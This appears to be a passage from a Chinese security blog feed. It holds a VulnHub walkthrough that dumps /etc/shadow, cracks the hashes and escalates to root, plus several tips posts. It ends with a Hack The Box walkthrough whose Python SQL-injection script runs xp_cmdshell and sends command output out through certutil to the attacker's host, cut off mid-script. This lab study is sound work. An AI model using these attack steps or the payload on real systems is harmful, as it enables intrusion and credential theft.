<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line">                                   ___          ____</span><br><span class="line">                               ,-<span class="string">&quot;&quot;</span>   `.      &lt; HONK &gt;</span><br><span class="line">                             ,<span class="string">&#x27;  _   e )`-._ /  ----                                                   </span></span><br><span class="line"><span class="string">                            /  ,&#x27;</span> `-._&lt;.===-<span class="string">&#x27;                                                          </span></span><br><span class="line"><span class="string">                           /  /                                                                        </span></span><br><span class="line"><span class="string">                          /  ;                                                                         </span></span><br><span class="line"><span class="string">              _          /   ;                                                                         </span></span><br><span class="line"><span class="string"> (`._    _.-&quot;&quot; &quot;&quot;--..__,&#x27;</span>    |                                                                         </span><br><span class="line"> &lt;_  `-<span class="string">&quot;&quot;</span>                     \                                                                        </span><br><span class="line">  &lt;`-                          :                                                                       </span><br><span class="line">   (__   &lt;__.                  ;                                                                       </span><br><span class="line">     `-.   <span class="string">&#x27;-.__.      _.&#x27;</span>    /                                                                        </span><br><span class="line">        \      `-.__,-<span class="string">&#x27;    _,&#x27;</span>                                                                         </span><br><span class="line">         `._    ,    /__,-<span class="string">&#x27;                                                                            </span></span><br><span class="line"><span class="string">            &quot;&quot;._\__,&#x27;</span>&lt; &lt;____                                                                           </span><br><span class="line">                 | |  `----.`.                                                                         </span><br><span class="line">                 | |        \ `.                                                                       </span><br><span class="line">                 ; |___      \-``                                                                      </span><br><span class="line">                 \   --&lt;                                                                               </span><br><span class="line">                  `.`.&lt;                                                                                </span><br><span class="line">                    `-<span class="string">&#x27;                                                                                </span></span><br><span class="line"><span class="string">                                                                                                       </span></span><br><span class="line"><span class="string">                                                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.64-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1952 exploits - 1092 auxiliary - 335 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use auxiliary/admin/webmin/file_disclosure</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; set RHOST 192.168.142.132</span></span><br><span class="line"><span class="string">RHOST =&gt; 192.168.142.132</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; exploit</span></span><br><span class="line"><span class="string">[*] Running module against 192.168.142.132</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attempting to retrieve /etc/passwd...</span></span><br><span class="line"><span class="string">[*] The server returned: 200 Document follows</span></span><br><span class="line"><span class="string">root:x:0:0::/root:/bin/bash</span></span><br><span class="line"><span class="string">bin:x:1:1:bin:/bin:</span></span><br><span class="line"><span class="string">daemon:x:2:2:daemon:/sbin:</span></span><br><span class="line"><span class="string">adm:x:3:4:adm:/var/log:</span></span><br><span class="line"><span class="string">lp:x:4:7:lp:/var/spool/lpd:</span></span><br><span class="line"><span class="string">sync:x:5:0:sync:/sbin:/bin/sync</span></span><br><span class="line"><span class="string">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span></span><br><span class="line"><span class="string">halt:x:7:0:halt:/sbin:/sbin/halt</span></span><br><span class="line"><span class="string">mail:x:8:12:mail:/:</span></span><br><span class="line"><span class="string">news:x:9:13:news:/usr/lib/news:</span></span><br><span class="line"><span class="string">uucp:x:10:14:uucp:/var/spool/uucppublic:</span></span><br><span class="line"><span class="string">operator:x:11:0:operator:/root:/bin/bash</span></span><br><span class="line"><span class="string">games:x:12:100:games:/usr/games:</span></span><br><span class="line"><span class="string">ftp:x:14:50::/var/ftp:</span></span><br><span class="line"><span class="string">smmsp:x:25:25:smmsp:/var/spool/clientmqueue:</span></span><br><span class="line"><span class="string">mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash</span></span><br><span class="line"><span class="string">rpc:x:32:32:RPC portmap user:/:/bin/false</span></span><br><span class="line"><span class="string">sshd:x:33:33:sshd:/:</span></span><br><span class="line"><span class="string">gdm:x:42:42:GDM:/var/state/gdm:/bin/bash</span></span><br><span class="line"><span class="string">pop:x:90:90:POP:/:</span></span><br><span class="line"><span class="string">nobody:x:99:99:nobody:/:</span></span><br><span class="line"><span class="string">guest:x:1000:100::/home/guest:/bin/bash</span></span><br><span class="line"><span class="string">goatse:x:1002:10:,,,:/home/goatse:/bin/bash</span></span><br><span class="line"><span class="string">jpelman:x:1003:100:,,,:/home/jpelman:/bin/bash</span></span><br><span class="line"><span class="string">jblow:x:1004:100:,,,:/home/jblow:/bin/bash</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; set RPATH /etc/shadow</span></span><br><span class="line"><span class="string">RPATH =&gt; /etc/shadow</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; exploit</span></span><br><span class="line"><span class="string">[*] Running module against 192.168.142.132</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attempting to retrieve /etc/shadow...</span></span><br><span class="line"><span class="string">[*] The server returned: 200 Document follows</span></span><br><span class="line"><span class="string">root:$1$k6V/lmUF$n2iBfemYg/IsVRyjqopr3.:14422:0:::::</span></span><br><span class="line"><span class="string">bin:*:9797:0:::::</span></span><br><span class="line"><span class="string">daemon:*:9797:0:::::</span></span><br><span class="line"><span class="string">adm:*:9797:0:::::</span></span><br><span class="line"><span class="string">lp:*:9797:0:::::</span></span><br><span class="line"><span class="string">sync:*:9797:0:::::</span></span><br><span class="line"><span class="string">shutdown:*:9797:0:::::</span></span><br><span class="line"><span class="string">halt:*:9797:0:::::</span></span><br><span class="line"><span class="string">mail:*:9797:0:::::</span></span><br><span class="line"><span class="string">news:*:9797:0:::::</span></span><br><span class="line"><span class="string">uucp:*:9797:0:::::</span></span><br><span class="line"><span class="string">operator:*:9797:0:::::</span></span><br><span class="line"><span class="string">games:*:9797:0:::::</span></span><br><span class="line"><span class="string">ftp:*:9797:0:::::</span></span><br><span class="line"><span class="string">smmsp:*:9797:0:::::</span></span><br><span class="line"><span class="string">mysql:*:9797:0:::::</span></span><br><span class="line"><span class="string">rpc:*:9797:0:::::</span></span><br><span class="line"><span class="string">sshd:*:9797:0:::::</span></span><br><span class="line"><span class="string">gdm:*:9797:0:::::</span></span><br><span class="line"><span class="string">pop:*:9797:0:::::</span></span><br><span class="line"><span class="string">nobody:*:9797:0:::::</span></span><br><span class="line"><span class="string">guest:$1$T7.0qXyH$hC4dje14rIUFJXbZUCkdB/:12876:0:99999:7:::</span></span><br><span class="line"><span class="string">goatse:$1$lXWz2SF8$sr5ux2i3UpMAf30t5uMtT0:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">jpelman:$1$3nO0QVVF$Iy21QTWTrHPd5/6ZrAvrj.:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">jblow:$1$35A0vqVF$MoYgZm/DxNS5nBZZk3Y2R1:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br></pre></td></tr></table></figure>

<p>将/etc/shadow保存为.txt文件然后使用john破解密码的hash,左边是密码，右边是用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt /root/goastshadow</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bobby            (jpelman)</span><br><span class="line">kokomo           (jblow)</span><br><span class="line">guest            (guest)</span><br><span class="line">gaping           (goatse)</span><br><span class="line">4g 0:00:00:49 DONE (2019-12-18 21:35) 0.08014g/s 282509p/s 320894c/s 320894C/s !!!0mc3t..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>使用其中一个用户goatse登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh goatse@192.168.142.132</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.142.132 (192.168.142.132)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:25uPigwKnzugpFkHd91FCdBukcikll8dkH4oV7OQROY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.142.132<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">goatse@192.168.142.132&#x27;</span>s password: </span><br><span class="line">Linux 2.6.15.</span><br><span class="line">goatse@slax:~$ id</span><br><span class="line">uid=1002(goatse) gid=10(wheel) groups=10(wheel)</span><br><span class="line">goatse@slax:~$ whoami</span><br><span class="line">goatse</span><br><span class="line">goatse@slax:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/goatse</span><br><span class="line">goatse@slax:~$</span><br></pre></td></tr></table></figure>

<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ uname -a</span><br><span class="line">Linux slax 2.6.15 <span class="comment">#1 SMP Tue Jan 10 07:53:57 GMT 2006 i686 unknown unknown GNU/Linux</span></span><br><span class="line">goatse@slax:~$ sudo -s</span><br><span class="line">Password:</span><br><span class="line">root@slax:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span><br><span class="line">root@slax:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>另一个方法通过使用旧内核,prctl权限提升漏洞。<br>exp下载，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvMjgy">BIND<i class="fa fa-external-link-alt"></i></span></p>
<p>kali端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br></pre></td></tr></table></figure>

<p>shell端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ wget http://192.168.142.128:8000/282.c</span><br><span class="line">--20:16:25--  http://192.168.142.128:8000/282.c</span><br><span class="line">           =&gt; `282.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.142.128:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 16,429 (16K) [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[===========================================================&gt;] 16,429        --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">20:16:25 (290.15 MB/s) - `282.c&#x27;</span> saved [16429/16429]</span><br></pre></td></tr></table></figure>

<p>编译并运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ gcc 282.c -o <span class="built_in">bind</span></span><br><span class="line">282.c:565:28: warning: no newline at end of file</span><br><span class="line">goatse@slax:~$ ls</span><br><span class="line">282.c*  <span class="built_in">bind</span>*  test.sh*</span><br><span class="line">oatse@slax:~$ ./<span class="built_in">bind</span> 127.0.0.1</span><br><span class="line">[*] named 8.2.x (&lt; 8.2.3-REL) remote root exploit by lucysoft, Ix</span><br><span class="line">[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net</span><br><span class="line"></span><br><span class="line">[*] attacking 127.0.0.1 (127.0.0.1)</span><br><span class="line">[d] HEADER is 12 long</span><br><span class="line">[d] infoleak_qry was 476 long</span><br><span class="line">[*] iquery resp len = 719</span><br><span class="line">[d] argevdisp1 = 080d7cd0, argevdisp2 = b7daea64</span><br><span class="line">[*] retrieved stack offset = bfc2a8f8</span><br><span class="line">[d] evil_query(buff, bfc2a8f8)</span><br><span class="line">[d] shellcode is 134 long</span><br><span class="line">[d] olb = 248</span><br><span class="line">[x] could not write our data <span class="keyword">in</span> buffer (offset0=56, rroffsetidx=4)</span><br><span class="line">[x] error sending tsig packet</span><br></pre></td></tr></table></figure>

<p>不知为什么一直运行失败，此SSH上还有一个root漏洞利用。 还有Apache的权限提升。 以及CUPS中的多个远程Shell漏洞。 这是一个旧漏洞的游乐场。 Metasploitable具有更多易受攻击的服务（以及Metasploitable 2），如果您正在寻找这样的游乐场，建议选择Goatsie上的那些。</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows下强制删除文件或文件夹(解除文件占用/Unlock，亲测实用)</title>
    <url>/2019/12/03/force-delete/</url>
    <content><![CDATA[<p><font color="green">想必的大多玩电脑的人都有下面的经历，就是有时想删除个什么文件，或者文件夹，电脑忽然弹出文件正在被占用，删除不了的情况，然后网上搜了一堆方法，大多是，新建bat文本里面填上如下的代码：</font></p>
<a id="more"></a>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DEL /F /A /Q \\?\%1</span><br><span class="line"></span><br><span class="line">RD /S /Q \\?\%1</span><br></pre></td></tr></table></figure>

<p><font color="green">然后将需要删除的文件拖到.bat文件上删除，但是有时候少数文件使用这种方法还是删除不了该怎么办呢？就要用到下面几种神器了，亲测有效.</font></p>
<h3 id="ProcessHacker"><a href="#ProcessHacker" class="headerlink" title="ProcessHacker"></a>ProcessHacker</h3><p>如果删除文件时，提示文件被占用，通过processhacker找到占用文件的进程。</p>
<p>在Processhacker中把占用的进程结束，然后就可以删除文件了。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2Rvd25sb2Fkcy5waHA=">ProcessHacker官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="LockHunter"><a href="#LockHunter" class="headerlink" title="LockHunter"></a>LockHunter</h3><p>推荐此软件：LockHunter - 右键解锁强制删除顽固文件(夹)，并可查看占用锁住文件的软件进程</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5pcGxheXNvZnQuY29tL2xvY2todW50ZXIuaHRtbA==">介绍<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5sb2NraHVudGVyLmNvbS9kb3dubG9hZC5odG0=">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h3><p><span class="exturl" data-url="aHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2hhbmRsZQ==">官网下载<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="IObit-Unlocker"><a href="#IObit-Unlocker" class="headerlink" title="IObit Unlocker"></a>IObit Unlocker</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuaXBsYXlzb2Z0LmNvbS9pb2JpdC11bmxvY2tlci5odG1s">IObit Unlocker - 免费实用的文件/夹强制解锁删除工具 (解决文件被占用无法删除/移动的问题)<i class="fa fa-external-link-alt"></i></span></p>
<p><strong><em>其它更多工具请自行<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8/Z3dzX3JkPXNzbA==">GOOGLE<i class="fa fa-external-link-alt"></i></span></em></strong></p>
]]></content>
      <categories>
        <category>tips</category>
      </categories>
      <tags>
        <tag>windows tips</tag>
      </tags>
  </entry>
  <entry>
    <title>获取手机拍摄照片的经纬度及详细位置的python脚本</title>
    <url>/2019/11/11/get-pic-location/</url>
    <content><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>本脚本的源码是xingag大佬的，本人只是稍作了改动，及添加了一些说明方式，使得脚本能够应用于更多场合。</p>
<p><font color="blue"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3hpbmdhZy8=">xingag大佬的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<p><font color="red"><strong><em><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci8=">本人的github<i class="fa fa-external-link-alt"></i></span></em></strong></font></p>
<a id="more"></a>

<h3 id="脚本使用说明"><a href="#脚本使用说明" class="headerlink" title="脚本使用说明"></a>脚本使用说明</h3><ul>
<li>1.先从高德开放平台上注册后再申请一个key，如下图所示。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location.jpg"></p>
<ul>
<li>2.如下几图所示修改main.py的源代码,使其对应正确的key和要分析的图片地址。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location2.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location3.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location4.jpg"></p>
<ul>
<li>3.运行代码前，先执行下面的代码安装exifread库。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install exifread</span><br></pre></td></tr></table></figure>
<p>该库是识别图片元数据的库，使用 exifread 库可以直接读取图片文件，获取到图片的元数据，包含经度、纬度、南北纬方向、东西经方向和拍摄时间。</p>
<ul>
<li>4.运行代码时，main.py和position_utils.py必须放在同一目录下。</li>
</ul>
<p>因为通过 GPS 获取的经度、纬度和高德地图的坐标存在一定的误差，这里需要用position_utils.py脚本把坐标转换为「火星坐标系」。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location5.jpg"></p>
<h2 id="最后附上一张效果图"><a href="#最后附上一张效果图" class="headerlink" title="最后附上一张效果图"></a>最后附上一张效果图</h2><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/location6.jpg"></p>
<h3 id="牛批哄哄的有没有"><a href="#牛批哄哄的有没有" class="headerlink" title="牛批哄哄的有没有?"></a><strong><em><font color="red">牛批哄哄的有没有?</font></em></strong></h3>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python脚本</tag>
        <tag>照片位置信息</tag>
      </tags>
  </entry>
  <entry>
    <title>将图片上传到github图床</title>
    <url>/2018/12/08/github-imagebed/</url>
    <content><![CDATA[<ol>
<li><strong><em>新建一个repositories</em></strong></li>
</ol>
<p><img src="/images/imagebed1.jpg"></p>
<ol start="2">
<li><strong><em>进入repositories下的wiki选项中</em></strong></li>
</ol>
<p><img src="/images/imagebed2.jpg"></p>
<ol start="3">
<li><strong><em>复制wiki对应的克隆地</em></strong></li>
</ol>
<p><img src="/images/imagebed3.jpg"></p>
<a id="more"></a>

<ol start="4">
<li><strong><em>在本地克隆项目</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/FDlucifer/FDlucifer.github.io.wiki.git</span><br></pre></td></tr></table></figure>

<ol start="5">
<li><strong><em>进入文件夹，将要上传的图片放在文件夹中</em></strong></li>
</ol>
<p><img src="/images/imagebed4.jpg"></p>
<ol start="6">
<li><strong><em>打开命令行，依次输入命令：</em></strong></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add 彼岸花.jpg</span><br><span class="line"></span><br><span class="line">git commit -a -m <span class="string">&quot;update&quot;</span></span><br><span class="line"></span><br><span class="line">git push </span><br></pre></td></tr></table></figure>

<ol start="7">
<li><strong><em>现在已经将图片放置Github图床</em></strong></li>
</ol>
<p><strong>图片的地址</strong> <img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/%E5%BD%BC%E5%B2%B8%E8%8A%B1.jpg" alt="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/彼岸花.jpg"></p>
]]></content>
      <categories>
        <category>网站前端样式</category>
      </categories>
      <tags>
        <tag>github imagebed</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[fighter]</title>
    <url>/2020/06/03/fighter/</url>
    <content><![CDATA[<h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:             Windows<br>Difficulty:     Insane<br>Points:         50<br>Release:     05 May 2018<br>IP:             10.10.10.72</p>
<p>User Blood:  00 days, 19 hours, 09 mins, 22 seconds.<br>Root Blood:  01 days, 04 hours, 16 mins, 21 seconds.</p>
<p>that’s crazy for me</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb33.jpg"></li>
<li><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></li>
</ul>
<a id="more"></a>

<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap and masscan as usaul</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># masscan -p1-65535 10.10.10.72 --rate=1000 -e tun0 &gt; ports</span></span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-04 02:35:05 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># ports=$(cat ports | awk -F &quot; &quot; &#x27;&#123;print $4&#125;&#x27; | awk -F &quot;/&quot; &#x27;&#123;print $1&#125;&#x27; | sort -n | tr &#x27;\n&#x27; &#x27;,&#x27; | sed &#x27;s/,$//&#x27;)</span></span><br><span class="line">root@kali:~/hackthebox/fighter<span class="comment"># nmap -Pn -sV -sC -v -p$ports 10.10.10.72</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 8.5</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/8.5</span><br><span class="line">|_http-title: StreetFighter Club</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>In the homepage, find the Domain name “streetfighterclub.htb”. add the domain to /etc/hosts file.</p>
<p>let’s look around, then find that there might be subdomains available that will give us more clues</p>
<p>intercept the request and send it to the intruder. We select where we want to brute force the request.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: §1§.streetfighterclub.htb</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<p>use namelist.txt located in /usr/share/dnsrecon/</p>
<p>find a subdomain called “members.streetfighterclub.htb” that gave HTTP code 403</p>
<p>then add the subdomain in /etc/hosts</p>
<p>open the webpage and got a 403 Forbidden error</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/</span><br></pre></td></tr></table></figure>

<p>use dirb to scan</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/</span><br><span class="line"></span><br><span class="line">/old</span><br></pre></td></tr></table></figure>

<p>then find web pages inside that directory. As we know that it is IIS server we find “asp” files on the web server and find a page called “login.asp”.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://members.streetfighterclub.htb/old -X .asp</span><br><span class="line"></span><br><span class="line">/login.asp</span><br></pre></td></tr></table></figure>

<p>now got </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://members.streetfighterclub.htb/old/login.asp</span><br></pre></td></tr></table></figure>

<h3 id="exploit-and-getshell-and-privilege-escalation"><a href="#exploit-and-getshell-and-privilege-escalation" class="headerlink" title="exploit and getshell and privilege escalation"></a>exploit and getshell and privilege escalation</h3><p>find that the web application is vulnerable to SQL injection in parameter “logintype=2”.  We find username, password, and e-mail but were unable to login. So we tried command injection using SQL injection. We referred the following link.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGFybG9naWMuY29tL2VuL2Jsb2cvcmVkLXRlYW0tdGFsZXMtMHgwMS8=">From MSSQL to RCE<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>so we made the following python3 payload script</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import base64</span><br><span class="line">from html.parser import HTMLParser</span><br><span class="line">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line">query_id   = 0</span><br><span class="line"></span><br><span class="line">def decode(data):</span><br><span class="line">    parser = HTMLParser()</span><br><span class="line">    try:</span><br><span class="line">        <span class="comment"># We don&#x27;t like Unicode strings, do we?</span></span><br><span class="line">        decoded_data = base64.b64decode(data)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&#x27;[-] decoding error&#x27;</span></span><br><span class="line">    <span class="built_in">return</span> decoded_data.decode(<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def get_command():</span><br><span class="line">    try:</span><br><span class="line">        cmd = input(<span class="string">&#x27;:\&gt; &#x27;</span>)</span><br><span class="line">        t = threading.Thread(target=send_command, args=(cmd,))</span><br><span class="line">        t.start()</span><br><span class="line">    except:</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def send_command(cmd):</span><br><span class="line">    global target_url, local_url</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;2;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @r varchar(6120),@cmdOutput varchar(6120);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;declare @res TABLE(line varchar(max));&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;insert into @res exec Xp_cmdshell %s;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path(&#x27;&#x27;)), 1, 1, &#x27;&#x27;)) as varbinary(max)) FOR XML PATH(&#x27;&#x27;), BINARY BASE64);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;set @r=concat(&#x27;certutil -urlcache -f http://10.10.14.3/&#x27;,@cmdOutput);&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;exec Xp_cmdshell @r;&quot;</span></span><br><span class="line">    payload += <span class="string">&quot;--&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Data for login</span></span><br><span class="line">    login = &#123;</span><br><span class="line">        <span class="string">&#x27;B1&#x27;</span>: <span class="string">&#x27;LogIn&#x27;</span>,</span><br><span class="line">        <span class="comment"># &#x27;logintype&#x27;: &quot;1 AND ISNULL(ASCII(SUBSTRING((SELECT @@version LIMIT 0,1)),&quot;+str(limit)+&quot;,1)),0)&gt;&quot;+str(char),</span></span><br><span class="line">        <span class="string">&#x27;logintype&#x27;</span>: payload % (cmd),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;rememberme&#x27;</span>: <span class="string">&#x27;ON&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.post(<span class="string">&quot;http://members.streetfighterclub.htb/old/verify.asp&quot;</span>, data=login)</span><br><span class="line"></span><br><span class="line">class MyServer(HTTPServer):</span><br><span class="line">    def server_activate(self):</span><br><span class="line">        <span class="comment"># get first command</span></span><br><span class="line">        get_command()</span><br><span class="line">        HTTPServer.server_activate(self)</span><br><span class="line"></span><br><span class="line">class 